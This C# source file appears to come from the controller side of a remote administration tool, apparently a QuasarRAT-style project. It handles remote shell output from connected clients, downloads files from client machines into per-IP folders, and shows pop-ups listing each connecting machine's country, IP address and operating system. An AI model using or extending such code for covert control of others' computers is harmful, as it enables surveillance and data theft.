using System;
using System.IO;
using System.Windows.Forms;
using xServer.Core.Helper;
using xServer.Core.Packets.ClientPackets;
using xServer.Forms;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {
        public static void HandleShellCommandResponse(Client client, ShellCommandResponse packet)
        {
            if (client.Value.FrmRs == null)
                return;

            try
            {
                client.Value.FrmRs.Invoke(
                    (MethodInvoker)delegate
                {
                    if (packet.IsError)
                    {
                        client.Value.FrmRs.PrintError(packet.Output);
                    }
                    else
                    {
                        client.Value.FrmRs.PrintMessage(packet.Output);
                    }
                }
                );
            }
            catch
            {
            }
        }

        public static void HandleDownloadFileResponse(Client client, DownloadFileResponse packet)
        {
            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString());
            if (!Directory.Exists(downloadPath))
                Directory.CreateDirectory(downloadPath);

            downloadPath = Path.Combine(downloadPath, packet.Filename);

            bool Continue = true;
            if (packet.CurrentBlock == 0 && File.Exists(downloadPath))
                if (
                    MessageBox.Show(string.Format("The file '{0}' already exists!\nOverwrite it?", packet.Filename),
                        "Overwrite Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
                    Continue = false;

            if (client.Value.FrmFm == null)
            {
                new Packets.ServerPackets.DownloadFileCanceled(packet.ID).Execute(client);
                MessageBox.Show("Please keep the File Manager open.\n\nWarning: Download aborted", "Download aborted",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            int index = 0;
            try
            {
                client.Value.FrmFm.Invoke((MethodInvoker)delegate
                {
                    foreach (ListViewItem lvi in client.Value.FrmFm.lstTransfers.Items)
                    {
                        if (packet.ID.ToString() == lvi.SubItems[0].Text)
                        {
                            index = lvi.Index;
                            break;
                        }
                    }
                });
            }
            catch
            {
                return;
            }

            if (Continue)
            {
                if (!string.IsNullOrEmpty(packet.CustomMessage))
                {
                    client.Value.FrmFm.Invoke((MethodInvoker)delegate
                    {
                        client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = packet.CustomMessage;
                        client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
                    });
                    return;
                }

                FileSplit destFile = new FileSplit(downloadPath);
                if (!destFile.AppendBlock(packet.Block, packet.CurrentBlock))
                {
                    client.Value.FrmFm.Invoke((MethodInvoker)delegate
                    {
                        client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = destFile.LastError;
                        client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
                    });
                    return;
                }

                decimal progress =
                    Math.Round((decimal)((double)(packet.CurrentBlock + 1) / (double)packet.MaxBlocks * 100.0), 2);

                client.Value.FrmFm.Invoke(
                    (MethodInvoker)
                        delegate
                        {
                            client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text =
                                string.Format("Downloading...({0}%)", progress);
                        });

                if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
                {
                    client.Value.FrmFm.Invoke((MethodInvoker)delegate
                    {
                        client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Completed";
                        client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 1;
                    });
                }
            }
            else
            {
                client.Value.FrmFm.Invoke((MethodInvoker)delegate
                {
                    client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Canceled";
                    client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
                });
            }
        }

        private static void ShowPopup(Client c)
        {
            FrmMain.Instance.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country),
                string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                    c.Value.OperatingSystem), ToolTipIcon.Info);
        }
    }
}